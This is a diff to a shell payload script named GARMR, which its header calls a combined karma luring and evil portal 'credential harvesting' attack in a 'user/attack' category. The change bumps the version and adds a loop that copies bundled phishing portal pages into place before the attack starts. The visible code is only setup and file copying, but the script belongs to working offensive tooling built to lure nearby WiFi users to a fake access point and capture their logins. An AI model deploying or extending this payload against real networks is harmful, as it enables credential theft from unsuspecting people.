@@ -2,7 +2,7 @@
 # Title: GARMR - Karma + Evil Portal Combined
 # Description: SKOLL's karma luring + LOKI's credential harvesting in one payload
 # Author: HaleHound
-# Version: 4.7.4
+# Version: 4.7.5
 # Category: user/attack
 #
 # Named after the blood-stained hound that guards the gates of HALE
@@ -1189,7 +1189,7 @@ LOG "┏━┛┏━┃┏━┃┏┏ ┏━┃"
 LOG "┃ ┃┏━┃┏┏┛┃┃┃┏┏┛"
 LOG "━━┛┛ ┛┛ ┛┛┛┛┛ ┛"
 LOG ""
-LOG "       GARMR v4.7.4"
+LOG "       GARMR v4.7.5"
 LOG ""
 
 led_setup
@@ -1197,6 +1197,18 @@ play_start
 VIBRATE
 
 mkdir -p "$LOOT_DIR"
+
+# === INSTALL BUNDLED PORTALS ===
+# Pager copies payload.sh to /tmp, so we search for portals in known locations
+for PAYLOAD_SOURCE in /mmc/root/payloads/library/user/evil_portal/garmr /mmc/root/payloads/user/fenrir/garmr /mmc/root/payloads/user/evil_portal/garmr; do
+    if [ -d "$PAYLOAD_SOURCE/portals" ]; then
+        LOG "Installing bundled portals from $PAYLOAD_SOURCE..."
+        mkdir -p "$PORTAL_DIR"
+        cp -r "$PAYLOAD_SOURCE/portals/"* "$PORTAL_DIR/" 2>/dev/null
+        LOG "Portals installed to $PORTAL_DIR"
+        break
+    fi
+done
 detect_portal_ip
 
 # === CHECK IF ALREADY RUNNING ===
